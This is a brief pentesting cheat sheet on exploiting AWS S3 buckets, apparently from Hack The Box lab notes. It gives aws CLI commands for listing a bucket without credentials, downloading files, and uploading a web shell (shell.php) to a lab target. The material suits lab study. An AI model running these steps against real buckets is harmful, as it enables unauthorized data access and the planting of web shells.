S3 Buckets

S3 buckets are fundamental containers within AWS's Simple Storage Service (S3), acting like folders to store and organize data

Exploitation

    ⚠️ IMPORTANT

    After exploiting any bucket you must know that there is a parameter which may be changed

    For external buckets (online)

    s3 = s3.amazonaws.com 

    aws s3 ...

    For internal buckets (HTB, TryHackme...) 

    aws --endpoint=http://s3.thetoppers.htb ...

    List bucket without passwd 

    aws s3 ls s3://s3.thetoppers.htb --no-sign-request

    List using credentials

    Requires the creation of a user and the modification of policies and configuration of keys. (aws configure) Example 

    aws --endpoint=http://s3.thetoppers.htb --profile=test s3 ls s3://thetoppers.htb

    Download using credentials 

    aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp s3://thetoppers.htb/index.php index.php

    Upload using credentials 

    aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp /home/kali/Desktop/Hackthebox/Starting\ POint/Three/shell.php s3://thetoppers.htb/shell.php
